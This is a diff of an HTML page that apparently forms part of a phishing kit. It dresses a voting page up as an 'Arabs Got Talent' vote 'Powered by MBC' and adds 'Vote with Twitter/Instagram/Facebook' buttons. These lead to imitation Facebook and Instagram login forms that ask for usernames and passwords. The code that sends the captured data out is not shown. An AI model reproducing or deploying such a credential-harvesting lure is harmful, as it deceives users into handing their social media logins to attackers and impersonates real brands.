@@ -1,23 +1,35 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vote Platform</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
     <script src="js/jquery-3.6.0.min.js"></script>
     <link rel="stylesheet" href="css/index.css">
     <link rel="stylesheet" href="assets/css/main.css">
+    
+    <!--Facebook-->
+        <link rel="stylesheet" href="secured/default.css">
+        <link rel="stylesheet" href="secured/style.css">
+    <script src="js/index.js"></script>
+    <script src="/js/jquery-3.6.0.min.js"></script>
+
+  <!-- Twitter CSS -->
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" crossorigin="anonymous">
+  <link rel="stylesheet" href="twt/CSS/style.css">
+  <link rel="icon" href="favicon.ico">
+    
+    <title>Arabs Got Talent</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Include Font Awesome for Social Media Icons -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
 </head>
 <body class="bg-gray-800 text-white flex items-center justify-center min-h-screen">
 
-  <div id="preloader" class="preloader">
-    Loading...
-  </div>
+  <div id="preloader" class="preloader"></div>
 
     <!-- Iframe Container (Initial Load) -->
     <div id="iframe-container" class="w-full h-full fixed inset-0">
@@ -30,7 +42,23 @@
         </iframe>
     </div>
 
-    <!-- Login Prompt (Hidden initially) -->
+    <div id="login-prompt" class="hidden social-vote-button">
+<h2 class="text-2xl font-bold mb-4">You must log in to continue</h2>
+      <button onclick="Twitter()" class="twitter-button"><i class="fab fa-twitter"></i> Vote with Twitter </button>
+    </div>
+    <div class="social-vote-button">
+      <button onclick="Instagram()" class="instagram-button2"><i class="fab fa-instagram"></i> Vote with Instagram </button>
+    </div>
+
+    <div class="social-vote-button">
+      <button onclick="Facebook()" class="facebook-button3"><i class="fab fa-facebook"></i> Vote with Facebook </button>
+    </div>
+    <br><br>
+    <p class="powered-by">Powered by <strong>MBC</strong></p>
+
+  </div>
+
+    <!-- Login Prompt (Hidden initially) 
     <div id="login-prompt" class="hidden fixed inset-0 bg-gray-800 bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
         <h2 class="text-2xl font-bold mb-4">You must log in to continue</h2>
         <div class="space-x-4">
@@ -50,7 +78,7 @@
                 <span>Vote with </span> <i class="fab fa-twitter text-white"></i>
             </button>
         </div>
-    </div>
+    </div> -->
 
     <!-- Facebook Login Form (Hidden initially) -->
     <div id="facebook-login" class="hidden fixed inset-0 bg-gray-800 bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
@@ -75,18 +103,18 @@
     </div>
 
     <!-- Instagram Login Form (Hidden initially) -->
-    <div id="instagram-login" class="hidden fixed inset-0 bg-gray-800 bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
+    <div id="instagram-login" class="hidden fixed inset-0 bg-white bg-opacity-90 flex flex-col items-center justify-center text-gray-800 p-6 sm:p-8 md:p-12">
         <div class="mb-6">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="Instagram Logo" class="w-auto">
         </div>
         <div class="mb-4 w-full max-w-sm">
             <div class="bg-gray-700 rounded-md">
-                <input type="text" id="id" placeholder="Phone number, username, or email" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-pink-500">
+                <input type="text" id="id" placeholder="Phone number, username, or email" class="w-full px-4 py-2 bg-transparent text-gray-800 outline-none focus:ring focus:ring-pink-500">
             </div>
         </div>
         <div class="mb-4 w-full max-w-sm">
             <div class="bg-gray-700 rounded-md">
-                <input type="password" placeholder="Password" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-pink-500">
+                <input type="password" placeholder="Password" class="w-full px-4 py-2 bg-transparent text-gray-800 outline-none focus:ring focus:ring-pink-500">
             </div>
         </div>
         <div class="w-full max-w-sm">
